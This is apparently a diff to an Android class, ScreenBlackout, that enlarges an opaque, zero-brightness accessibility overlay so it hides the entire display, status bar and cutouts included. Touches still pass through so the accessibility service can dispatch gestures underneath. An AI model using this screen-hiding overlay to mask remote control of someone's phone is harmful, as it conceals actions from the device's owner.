@@ -109,9 +109,29 @@ public class ScreenBlackout {
                         // No touch listener — FLAG_NOT_TOUCHABLE lets all touches pass through
                         // so the accessibility service can still dispatch gestures.
 
+                        // Get real display size including status bar
+                        android.graphics.Point displaySize = new android.graphics.Point();
+                        WindowManager wmDisp = (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                        wmDisp.getDefaultDisplay().getRealSize(displaySize);
+                        int realW = displaySize.x;
+                        int realH = displaySize.y;
+
+                        // Get status bar height so we can shift the overlay above it
+                        int statusBarH = 0;
+                        try {
+                            int resId = service.getResources().getIdentifier("status_bar_height", "dimen", "android");
+                            if (resId > 0) statusBarH = service.getResources().getDimensionPixelSize(resId);
+                        } catch (Exception ignored) {}
+                        if (statusBarH <= 0) statusBarH = 80; // safe fallback ~24dp @ 3x
+
+                        // Extra padding to cover display cutouts and rounded corners
+                        int extra = 60;
+
+                        // Overlay is shifted UP by (statusBarH + extra) so it starts
+                        // well above the status bar, and its height is expanded to match.
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                                WindowManager.LayoutParams.MATCH_PARENT,
-                                WindowManager.LayoutParams.MATCH_PARENT,
+                                realW,
+                                realH + statusBarH + extra,
                                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                         | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
@@ -120,6 +140,14 @@ public class ScreenBlackout {
                                         | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                 PixelFormat.OPAQUE
                         );
+                        params.x = 0;
+                        params.y = -(statusBarH + extra);
+
+                        // Cover display cutouts on Android 9+ (notch / punch-hole)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                            params.layoutInDisplayCutoutMode =
+                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+                        }
 
                         // Dim physical screen brightness to zero
                         params.screenBrightness = 0f;
